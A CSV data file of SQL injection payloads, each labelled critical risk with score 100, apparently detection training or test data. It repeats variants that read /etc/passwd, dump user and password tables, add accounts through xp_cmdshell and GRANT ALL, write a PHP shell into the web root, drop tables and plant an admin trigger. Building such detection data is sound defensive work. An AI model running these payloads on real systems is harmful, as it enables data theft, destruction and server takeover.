query,risk,score
'; SELECT * FROM mysql.user; -- OR 1=1 -- ,critical,100
'; SELECT * FROM mysql.user; -- -- bzr6,critical,100
"' UNION SELECT username, password FROM users /**/ /* # lpj3l",critical,100
'; SELECT load_file('/etc/passwd'); # OR 1=1 -- ,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- OR 1=1 -- ,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- -- pdvb,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- # ks26x,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- /**/ # ",critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # h1ahj",critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- AND 1=1",critical,100
'; DROP TABLE users; -- /* test */ # 51xsy,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- AND 1=1",critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- OR 1=1 -- ,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- AND 1=1,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- LIMIT 1,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- bmd2",critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- LIMIT 1,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- AND 1=1,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- OR 1=1 -- ,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- OR 1=1 -- ,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- /**/ # ,critical,100
'; SELECT load_file('/etc/passwd'); # -- 90u5,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- AND 1=1",critical,100
"' UNION SELECT username, password FROM users /**/ /* -- j37y",critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- /**/ # ",critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- OR 1=1 -- ,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # 9soh8,critical,100
'; DROP TABLE users; -- /* test */ /**/ # ,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- AND 1=1,critical,100
' INTO OUTFILE '/var/www/shell.php' -- # 8g5ec,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- AND 1=1,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- LIMIT 1,critical,100
'; SELECT * FROM mysql.user; -- # zmt39,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- OR 1=1 -- ,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- AND 1=1,critical,100
"' UNION SELECT username, password FROM users /**/ /* -- d00k",critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- af4v,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- # eyho1,critical,100
"' UNION SELECT username, password FROM users /**/ /* AND 1=1",critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- /**/ # ,critical,100
' INTO OUTFILE '/var/www/shell.php' -- -- e5gd,critical,100
"' UNION SELECT username, password FROM users /**/ /* LIMIT 1",critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- /**/ # ",critical,100
'; SELECT * FROM mysql.user; -- # 4s0l3,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- -- tigk,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # zy0fd,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- -- ie2l,critical,100
"' UNION SELECT username, password FROM users /**/ /* AND 1=1",critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- LIMIT 1",critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- AND 1=1,critical,100
' INTO OUTFILE '/var/www/shell.php' -- LIMIT 1,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- OR 1=1 -- ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- AND 1=1",critical,100
"' UNION SELECT username, password FROM users /**/ /* OR 1=1 -- ",critical,100
'; SELECT * FROM mysql.user; -- -- 03w4,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- OR 1=1 -- ,critical,100
'; SELECT load_file('/etc/passwd'); # LIMIT 1,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- hwkg,critical,100
"' UNION SELECT username, password FROM users /**/ /* AND 1=1",critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- -- 9x18,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- AND 1=1,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- LIMIT 1,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- LIMIT 1,critical,100
'; SELECT load_file('/etc/passwd'); # # d5513,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- LIMIT 1,critical,100
"' UNION SELECT username, password FROM users /**/ /* AND 1=1",critical,100
'; SELECT load_file('/etc/passwd'); # AND 1=1,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- LIMIT 1,critical,100
' INTO OUTFILE '/var/www/shell.php' -- # h169n,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- # dzfmy,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- AND 1=1,critical,100
'; DROP TABLE users; -- /* test */ LIMIT 1,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- OR 1=1 -- ,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- OR 1=1 -- ,critical,100
' INTO OUTFILE '/var/www/shell.php' -- /**/ # ,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- /**/ # ,critical,100
' INTO OUTFILE '/var/www/shell.php' -- -- wt8z,critical,100
'; SELECT * FROM mysql.user; -- # vncwu,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- iujf,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- OR 1=1 -- ,critical,100
'; SELECT * FROM mysql.user; -- -- 5wyl,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- AND 1=1,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- LIMIT 1,critical,100
"' UNION SELECT username, password FROM users /**/ /* OR 1=1 -- ",critical,100
' INTO OUTFILE '/var/www/shell.php' -- # atb7v,critical,100
'; DROP TABLE users; -- /* test */ LIMIT 1,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # jn7j8,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- wnnb",critical,100
'; SELECT load_file('/etc/passwd'); # OR 1=1 -- ,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- /**/ # ,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- -- swe2,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # jlxc8",critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- /**/ # ",critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- /**/ # ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- OR 1=1 -- ",critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- OR 1=1 -- ",critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- AND 1=1,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # a3d7h,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- LIMIT 1,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- /**/ # ",critical,100
"' UNION SELECT username, password FROM users /**/ /* -- s353",critical,100
' INTO OUTFILE '/var/www/shell.php' -- -- zxuu,critical,100
"' UNION SELECT username, password FROM users /**/ /* -- 0t12",critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- AND 1=1,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- 24rn,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- /**/ # ",critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # c5jei",critical,100
'; SELECT load_file('/etc/passwd'); # -- ppj8,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- # ww3ft,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- LIMIT 1",critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- k3i9,critical,100
' INTO OUTFILE '/var/www/shell.php' -- /**/ # ,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- AND 1=1,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- -- ffd1,critical,100
'; SELECT load_file('/etc/passwd'); # AND 1=1,critical,100
"' UNION SELECT username, password FROM users /**/ /* # yeias",critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- OR 1=1 -- ,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- OR 1=1 -- ,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- AND 1=1,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- OR 1=1 -- ,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- OR 1=1 -- ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- AND 1=1",critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- ux98,critical,100
'; DROP TABLE users; -- /* test */ OR 1=1 -- ,critical,100
'; DROP TABLE users; -- /* test */ AND 1=1,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- LIMIT 1,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- OR 1=1 -- ",critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- /**/ # ,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- -- pvrm,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- AND 1=1,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- gkeo",critical,100
'; SELECT load_file('/etc/passwd'); # /**/ # ,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- OR 1=1 -- ,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # 5jgvz,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- LIMIT 1,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- -- tvuz,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- OR 1=1 -- ,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- LIMIT 1,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- LIMIT 1,critical,100
' INTO OUTFILE '/var/www/shell.php' -- AND 1=1,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- OR 1=1 -- ,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- OR 1=1 -- ,critical,100
'; SELECT * FROM mysql.user; -- /**/ # ,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- AND 1=1,critical,100
'; SELECT * FROM mysql.user; -- LIMIT 1,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- /**/ # ,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # fx48g,critical,100
'; DROP TABLE users; -- /* test */ OR 1=1 -- ,critical,100
' INTO OUTFILE '/var/www/shell.php' -- LIMIT 1,critical,100
'; DROP TABLE users; -- /* test */ -- 2epp,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- OR 1=1 -- ,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- OR 1=1 -- ,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- OR 1=1 -- ,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- OR 1=1 -- ,critical,100
'; DROP TABLE users; -- /* test */ /**/ # ,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- /**/ # ,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- OR 1=1 -- ,critical,100
"' UNION SELECT username, password FROM users /**/ /* /**/ # ",critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- OR 1=1 -- ,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- # 5998g,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- LIMIT 1,critical,100
'; SELECT load_file('/etc/passwd'); # # kd1yf,critical,100
'; DROP TABLE users; -- /* test */ -- zd5a,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- AND 1=1,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- OR 1=1 -- ,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- /**/ # ",critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # kagzl",critical,100
'; SELECT * FROM mysql.user; -- -- lp7w,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # m6p5o,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- OR 1=1 -- ,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- LIMIT 1,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- # t1t8q,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- OR 1=1 -- ,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- /**/ # ,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- /**/ # ,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- AND 1=1,critical,100
'; SELECT * FROM mysql.user; -- /**/ # ,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- /**/ # ,critical,100
'; SELECT * FROM mysql.user; -- -- 4gko,critical,100
"' UNION SELECT username, password FROM users /**/ /* AND 1=1",critical,100
'; SELECT * FROM mysql.user; -- -- qvjn,critical,100
'; SELECT load_file('/etc/passwd'); # /**/ # ,critical,100
'; DROP TABLE users; -- /* test */ LIMIT 1,critical,100
'; SELECT * FROM mysql.user; -- AND 1=1,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- -- g1e0,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # 5kutv",critical,100
'; DROP TABLE users; -- /* test */ -- 0tcj,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- /**/ # ",critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- LIMIT 1,critical,100
'; SELECT * FROM mysql.user; -- /**/ # ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- qfpm",critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- -- jx0d,critical,100
' INTO OUTFILE '/var/www/shell.php' -- /**/ # ,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- LIMIT 1,critical,100
' INTO OUTFILE '/var/www/shell.php' -- # qbcif,critical,100
'; DROP TABLE users; -- /* test */ # 0jlil,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- AND 1=1,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- LIMIT 1,critical,100
'; SELECT load_file('/etc/passwd'); # OR 1=1 -- ,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- AND 1=1",critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- LIMIT 1,critical,100
"' UNION SELECT username, password FROM users /**/ /* LIMIT 1",critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- -- unwp",critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- AND 1=1",critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- OR 1=1 -- ,critical,100
'; SELECT load_file('/etc/passwd'); # # wrvt6,critical,100
' INTO OUTFILE '/var/www/shell.php' -- # 6fd4n,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- -- fyh1",critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- AND 1=1,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- AND 1=1,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- # ffcun,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- LIMIT 1,critical,100
"' UNION SELECT username, password FROM users /**/ /* OR 1=1 -- ",critical,100
' INTO OUTFILE '/var/www/shell.php' -- /**/ # ,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- /**/ # ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- fl7q",critical,100
' INTO OUTFILE '/var/www/shell.php' -- AND 1=1,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- /**/ # ,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- OR 1=1 -- ,critical,100
'; DROP TABLE users; -- /* test */ OR 1=1 -- ,critical,100
"' UNION SELECT username, password FROM users /**/ /* LIMIT 1",critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- OR 1=1 -- ",critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- /**/ # ,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- es1o,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- -- vb1f,critical,100
' INTO OUTFILE '/var/www/shell.php' -- LIMIT 1,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- LIMIT 1,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- # 0xeae,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- OR 1=1 -- ",critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- OR 1=1 -- ,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- /**/ # ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- AND 1=1",critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- LIMIT 1,critical,100
'; SELECT load_file('/etc/passwd'); # # 43ka4,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- /**/ # ,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # u9zis,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- OR 1=1 -- ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- LIMIT 1",critical,100
'; DROP TABLE users; -- /* test */ /**/ # ,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- AND 1=1,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- AND 1=1,critical,100
'; SELECT load_file('/etc/passwd'); # LIMIT 1,critical,100
' INTO OUTFILE '/var/www/shell.php' -- # b3s8k,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # ibzin,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- /**/ # ",critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- LIMIT 1,critical,100
'; SELECT * FROM mysql.user; -- -- o35z,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- AND 1=1,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- LIMIT 1,critical,100
'; DROP TABLE users; -- /* test */ AND 1=1,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- AND 1=1,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- AND 1=1,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- /**/ # ,critical,100
'; SELECT * FROM mysql.user; -- AND 1=1,critical,100
'; SELECT load_file('/etc/passwd'); # AND 1=1,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- OR 1=1 -- ,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- LIMIT 1,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- OR 1=1 -- ",critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- OR 1=1 -- ,critical,100
' INTO OUTFILE '/var/www/shell.php' -- # peas3,critical,100
'; SELECT * FROM mysql.user; -- # z6oa6,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- AND 1=1,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- xza5,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- LIMIT 1,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- LIMIT 1,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- AND 1=1,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # mlnw3",critical,100
